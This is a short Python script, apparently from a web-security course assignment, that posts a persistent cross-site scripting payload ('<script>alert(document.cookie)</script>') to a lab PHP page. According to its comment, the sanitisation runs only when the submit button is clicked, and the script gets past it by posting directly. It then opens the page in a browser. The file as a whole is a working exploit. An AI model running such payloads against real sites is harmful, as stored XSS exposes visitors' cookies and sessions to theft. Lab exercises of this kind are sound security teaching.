import requests
import webbrowser

# Exploit: post request with script, the sanitise function is bypassed since it
# only sanitises on click of the submit button
# Persistent XSS

def main():
    url = 'http://wsb.com/Assignment2/case04.php'
    payload = {'title':'Exploit', 'content':'<script>alert(document.cookie)</script>'}
    r = requests.post(url, data=payload)

    webbrowser.open(url, 2)

if __name__ == "__main__":
    main()
